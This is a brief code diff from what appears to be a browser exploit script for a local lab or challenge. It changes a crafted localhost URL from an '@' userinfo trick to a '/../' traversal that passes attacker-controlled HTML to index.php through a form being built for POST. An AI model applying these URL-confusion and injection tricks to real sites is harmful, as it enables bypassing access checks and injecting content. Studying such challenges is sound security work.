@@ -4,7 +4,7 @@
 (function () {
   function go() {
     const y = new URL(location.href).searchParams.get("y") || "";
-    const sim = "http://localhost:5000/admin.php@localhost:5000/index.php?html=" + y;
+    const sim = "http://localhost:5000/admin.php/../index.php?html=" + y;
 
     const f = document.createElement("form");
     f.method = "POST";
